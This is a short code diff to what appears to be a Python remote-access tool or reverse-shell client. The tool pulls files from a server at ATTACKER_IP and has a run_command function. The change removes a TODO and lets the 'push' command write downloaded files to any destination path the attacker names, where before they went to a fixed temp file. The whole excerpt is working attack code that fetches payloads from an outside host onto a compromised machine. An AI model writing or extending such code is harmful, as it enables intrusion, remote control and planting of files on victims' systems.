@@ -1,4 +1,3 @@
-# TODO: unrestrict the upload and download path
 from urllib import request, parse
 import subprocess
 import time
@@ -32,11 +31,11 @@ def send_file(command):
 
 def save_file(command):
  if 'push' in command:
-  push, path = command.strip().split(' ')
+  push, path, dst_path = command.strip().split(' ')
   get_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/?get={path}'   
   with request.urlopen(get_url) as f:
    res_file = f.read()
-  with open('D:/tmp/tempfile','wb') as f:
+  with open('{}'.format(dst_path),'wb') as f:
    f.write(res_file)
       
 def run_command(command):
